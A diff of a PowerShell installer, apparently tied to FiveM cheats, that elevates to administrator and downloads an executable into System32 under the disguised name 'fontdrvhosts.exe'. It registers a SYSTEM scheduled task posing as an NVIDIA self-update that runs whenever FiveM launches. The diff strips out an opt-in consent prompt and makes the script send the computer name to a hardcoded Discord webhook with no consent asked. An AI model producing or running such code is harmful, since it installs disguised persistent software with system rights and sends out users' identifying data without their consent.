@@ -1,7 +1,6 @@
-# ================================
-# CHX Installer with Opt-in HWID/ComputerName webhook
-# ================================
-# แสดงเมนูให้เลือก
+# -----------------------------
+# Menu Selection
+# -----------------------------
 Write-Host "Select Mode:"
 Write-Host "1. Install"
 Write-Host "2. Clean"
@@ -9,58 +8,42 @@ Write-Host "2. Clean"
 $choice = Read-Host "Enter choice (1/2)"
 
 # -----------------------------
-# ตรวจสอบสิทธิ์ Administrator
+# Check for Administrator rights
 # -----------------------------
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
     Write-Host "Restarting with Administrator privileges..."
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
 # -----------------------------
-# กำหนด path และตัวแปร
+# Define paths and variables
 # -----------------------------
-$system32Path  = "$env:windir\System32"
+$system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
-$taskName       = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
-$exeUrl         = "https://github.com/Chxtoqfee12/Fivem/releases/download/Chx_12/Chx.exe"
+$taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
+$exeUrl        = "https://github.com/Chxtoqfee12/Fivem/releases/download/Chx_12/Chx.exe"
 
-# Webhook ที่ผู้ใช้ให้มา
+# Webhook
 $webhookUrl = "https://discord.com/api/webhooks/1424002804988514346/hfC8h7QRd0Xn-iQQTxmthRd63ikRrpOYuLdPNtmeadsyAae0j9jB4fkXTtYSs91An2u8"
 
 function Send-WebhookNotification {
     param(
         [string]$webhook,
-        [string]$content,
-        [hashtable]$extraFields = $null
+        [string]$message
     )
-
     try {
-        # สร้าง payload เบื้องต้น (content + embed ให้สวยงาม)
-        $embed = @{
-            title = "CHX Installer Notification"
-            description = $content
-            timestamp = (Get-Date).ToString("o")
-        }
-
-        if ($extraFields) {
-            # แปลง hashtable fields เป็น array ของ field objects ถ้ามี
-            $embed.fields = @()
-            foreach ($key in $extraFields.Keys) {
-                $embed.fields += @{
-                    name = $key
-                    value = $extraFields[$key]
-                    inline = $false
-                }
-            }
-        }
-
         $payload = @{
-            content = $null
-            embeds = @($embed)
+            content = $message
+            embeds  = @(
+                @{
+                    title = "Installer Notification"
+                    description = $message
+                    timestamp = (Get-Date).ToString("o")
+                }
+            )
         }
-
-        $json = $payload | ConvertTo-Json -Depth 6
+        $json = $payload | ConvertTo-Json -Depth 4
         Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $json -ErrorAction Stop
         Write-Host "Webhook notification sent."
     } catch {
@@ -69,96 +52,32 @@ function Send-WebhookNotification {
 }
 
 # -----------------------------
-# ฟังก์ชันดึง HWID (จาก WMI) และชื่อเครื่อง
-# -----------------------------
-function Get-HWID {
-    try {
-        $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct -ErrorAction Stop).UUID
-        return $uuid
-    } catch {
-        return $null
-    }
-}
-
-function Get-ComputerName {
-    return $env:COMPUTERNAME
-}
-
-# -----------------------------
-# Install Mode (พร้อม opt-in)
+# Install Mode
 # -----------------------------
 if ($choice -eq "1") {
     Write-Host "Starting installation..."
 
-    # ขั้นแรก: แจ้งเริ่มติดตั้ง (ไม่ส่งข้อมูลส่วนบุคคล)
-    Send-WebhookNotification -webhook $webhookUrl -content "Install started for CHX package. (No personal data sent) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    # ส่งชื่อเครื่องไป webhook ทันที
+    $computerName = $env:COMPUTERNAME
+    Send-WebhookNotification -webhook $webhookUrl -message "Install started on computer: $computerName - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
-    # ถามผู้ใช้ว่าต้องการยินยอมส่งข้อมูลเพื่อช่วยยืนยัน/ลงทะเบียนหรือไม่
-    Write-Host ""
-    Write-Host "Optional: You may choose to send your HWID and/or Computer Name to the webhook for license/debug purposes."
-    $consent_send = Read-Host "Do you consent to send identifying info to the webhook? (y/n)"
-
-    $extraFieldsToSend = @{}
-
-    if ($consent_send -eq "y" -or $consent_send -eq "Y") {
-        # ถามว่าจะส่งอะไรบ้าง
-        Write-Host "You agreed to send identifying info. Select what to send:"
-        Write-Host "1. HWID only"
-        Write-Host "2. Computer Name only"
-        Write-Host "3. Both HWID and Computer Name"
-        Write-Host "4. Cancel (do not send)"
-        $subChoice = Read-Host "Enter choice (1/2/3/4)"
-
-        switch ($subChoice) {
-            "1" {
-                $hwid = Get-HWID
-                if ($hwid) { $extraFieldsToSend["HWID"] = $hwid } else { $extraFieldsToSend["HWID"] = "Unavailable" }
-            }
-            "2" {
-                $extraFieldsToSend["ComputerName"] = Get-ComputerName
-            }
-            "3" {
-                $hwid = Get-HWID
-                if ($hwid) { $extraFieldsToSend["HWID"] = $hwid } else { $extraFieldsToSend["HWID"] = "Unavailable" }
-                $extraFieldsToSend["ComputerName"] = Get-ComputerName
-            }
-            default {
-                Write-Host "User chose not to send identifying info."
-            }
-        }
-
-        if ($extraFieldsToSend.Count -gt 0) {
-            # ยืนยันการส่งครั้งสุดท้าย
-            Write-Host ""
-            Write-Host "About to send the following information to the webhook:"
-            foreach ($k in $extraFieldsToSend.Keys) { Write-Host "$k : $($extraFieldsToSend[$k])" }
-            $confirm = Read-Host "Confirm send? (y/n)"
-            if ($confirm -eq "y" -or $confirm -eq "Y") {
-                Send-WebhookNotification -webhook $webhookUrl -content "User-consented identifying info (Install) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -extraFields $extraFieldsToSend
-            } else {
-                Write-Host "User cancelled final confirmation. Not sending identifying info."
-            }
-        }
-    } else {
-        Write-Host "User declined to send identifying info."
-    }
-
-    # ดำเนินการติดตั้งจริง (ดาวน์โหลด + สร้าง scheduled task)
     try {
+        # ดาวน์โหลดไฟล์ exe ไปยัง System32
         Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination -UseBasicParsing -ErrorAction Stop
 
+        # สร้าง Scheduled Task
         $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
         Invoke-Expression $cmd
 
+        # เปิด Audit Logging
         auditpol /set /subcategory:"Process Creation" /success:enable
 
         Write-Host "Installation completed."
-        Send-WebhookNotification -webhook $webhookUrl -content "Install completed successfully for CHX package. - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        Send-WebhookNotification -webhook $webhookUrl -message "Install completed successfully on computer: $computerName - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     } catch {
         Write-Warning "Installation failed: $($_.Exception.Message)"
-        Send-WebhookNotification -webhook $webhookUrl -content "Install failed for CHX package: $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        Send-WebhookNotification -webhook $webhookUrl -message "Install failed on computer: $computerName - $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     }
-
 }
 
 # -----------------------------
@@ -170,10 +89,11 @@ elseif ($choice -eq "2") {
         schtasks /delete /tn $taskName /f
         if (Test-Path $exeDestination) { Remove-Item $exeDestination -Force }
         Write-Host "Cleanup completed."
-        Send-WebhookNotification -webhook $webhookUrl -content "Cleanup completed for CHX package. - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        $computerName = $env:COMPUTERNAME
+        Send-WebhookNotification -webhook $webhookUrl -message "Cleanup completed on computer: $computerName - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     } catch {
         Write-Warning "Cleanup error: $($_.Exception.Message)"
-        Send-WebhookNotification -webhook $webhookUrl -content "Cleanup failed for CHX package: $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        Send-WebhookNotification -webhook $webhookUrl -message "Cleanup failed on computer: $computerName - $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     }
 }
 
